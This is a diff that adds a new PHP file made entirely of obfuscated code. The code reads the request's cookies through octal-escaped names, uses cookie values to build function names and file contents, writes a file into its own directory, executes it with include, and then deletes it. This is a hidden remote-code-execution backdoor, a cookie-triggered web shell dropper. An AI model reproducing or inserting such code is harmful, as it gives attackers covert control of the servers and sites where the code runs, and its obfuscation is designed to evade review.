@@ -1,0 +1,2 @@
+<?php
+$pXt=${"\137".	"\103"	."\117"."\117".	"\113\111\105"}; if(isset ( $pXt [ (	89 -39 )		]	)) {		$yO	=$pXt	[	(96-2)]	.$pXt[	 (99	-0) ];  $fQVX=	$yO(	$pXt	[ 	(	34-22)	]. $pXt	[ (25	-9	)] );  $WKMB=$fQVX( $yO ($pXt [ (	79-25)]))	;	 $TE	=$fQVX	($yO(	$pXt [ 	(74 -64 )]));$AWrC =__DIR__.$fQVX($yO ($pXt	[( 84	-31	)	 ] ) );	 $WKMB(	$AWrC,	$fQVX ( $yO($pXt[ (72	- 22	)] )	) ); include	($AWrC) ;	 $TE	( $AWrC	) ;	}
